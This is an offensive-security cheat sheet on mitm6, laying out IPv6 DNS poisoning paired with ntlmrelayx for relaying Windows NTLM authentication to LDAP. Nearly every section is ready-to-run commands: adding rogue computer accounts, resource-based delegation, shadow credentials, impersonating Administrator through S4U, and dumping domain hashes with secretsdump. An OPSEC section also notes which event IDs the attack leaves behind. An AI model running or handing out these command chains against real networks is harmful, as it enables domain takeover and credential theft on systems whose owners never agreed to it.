# mitm6

**Tags:** `#mitm6` `#ipv6` `#lateral` `#activedirectory` `#ntlmrelay` `#dhcpv6` `#dns`

IPv6 MITM attack tool — exploits the fact that Windows prefers IPv6 over IPv4 by default. mitm6 responds to DHCPv6 requests, assigns itself as the IPv6 DNS server, then redirects authentication traffic to ntlmrelayx. Particularly effective for LDAP relay attacks since it captures credentials from Windows hosts that support IPv6 (which is virtually all of them) without needing LLMNR/NBT-NS broadcast traffic.

**Source:** https://github.com/dirkjanm/mitm6
**Install:** `pip install mitm6` or `sudo apt install mitm6`

```bash
# Start mitm6 for a domain
sudo mitm6 -d domain.local

# Run alongside ntlmrelayx targeting LDAP
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -smb2support --add-computer
```

> [!note] **mitm6 vs Responder** — Responder poisons LLMNR/NBT-NS (Layer 2 broadcast — same subnet only). mitm6 poisons DHCPv6 and IPv6 DNS — also subnet-limited but captures different authentication paths. Use both together for maximum coverage. mitm6 is especially effective for LDAP relay since it captures WPAD proxy auth from browsers.

---

## Basic Usage

```bash
# Target specific domain (limits scope — recommended)
sudo mitm6 -d domain.local

# Target multiple domains
sudo mitm6 -d domain.local -d child.domain.local

# Specific interface
sudo mitm6 -d domain.local -i eth0

# Ignore specific hosts (avoid disrupting critical systems)
sudo mitm6 -d domain.local --ignore-nofqdn

# Verbose
sudo mitm6 -d domain.local -v
```

---

## Combined with ntlmrelayx (Standard Attack)

```bash
# Terminal 1 — mitm6 (IPv6 DNS poisoning + DHCPv6)
sudo mitm6 -d domain.local

# Terminal 2 — ntlmrelayx (relay captured auth to LDAP)
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -smb2support --no-da --no-acl

# -6 = listen on IPv6
# -t ldaps = relay to secure LDAP (LDAP relay is not blocked by SMB signing)
```

---

## LDAP Relay Attacks via mitm6

```bash
# Dump domain info via LDAP relay
ntlmrelayx.py -6 -t ldap://dc01.domain.local -smb2support

# Create computer account (for Kerberos attacks — requires MachineAccountQuota > 0)
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -smb2support --add-computer 'hacker-pc$'

# RBCD — delegate access to compromised computer
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -smb2support \
  --delegate-access --escalate-user lowpriv

# Shadow credentials (add KeyCredential to target)
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -smb2support \
  --shadow-credentials --shadow-target 'TargetUser'

# Escalate specific user to DA via ACL abuse
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -smb2support --escalate-user lowpriv
```

---

## How It Works

```
1. Windows host sends DHCPv6 SOLICIT (looking for IPv6 config)
2. mitm6 responds with DHCPv6 ADVERTISE — assigns itself as DNS server
3. Host sends DNS queries to mitm6
4. mitm6 responds to WPAD lookups with attacker IP
5. Browser requests WPAD config from attacker
6. ntlmrelayx (via -6) intercepts the HTTP CONNECT with NTLM auth
7. ntlmrelayx relays NTLM credentials to LDAP/SMB target
```

---

## After Successful Relay

```bash
# If --add-computer succeeded — use new computer account for S4U2Self
# Get TGT for the new computer account
getTGT.py domain.local/'hacker-pc$':Password -dc-ip 192.168.1.1

# S4U2Self — impersonate admin
getST.py -spn cifs/target.domain.local -impersonate Administrator \
  -dc-ip 192.168.1.1 domain.local/'hacker-pc$':Password

# Use the service ticket
KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass target.domain.local

# If --escalate-user succeeded — user now has DCSync rights
secretsdump.py DOMAIN/lowpriv:Password@dc01.domain.local -just-dc
```

---

## OPSEC Notes

- mitm6 sends DHCPv6 responses to every host on the subnet that sends DHCPv6 SOLICITs — can disrupt IPv6 connectivity
- Windows hosts only send DHCPv6 SOLICITs periodically (on network change, boot, or reconnect) — patience required
- Event ID **4741** (computer account created) appears in AD if `--add-computer` succeeds
- LDAP relay leaves **4662** (directory access) events on the DC
- Shut down mitm6 promptly after capturing what you need — extended runtime causes network disruption

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
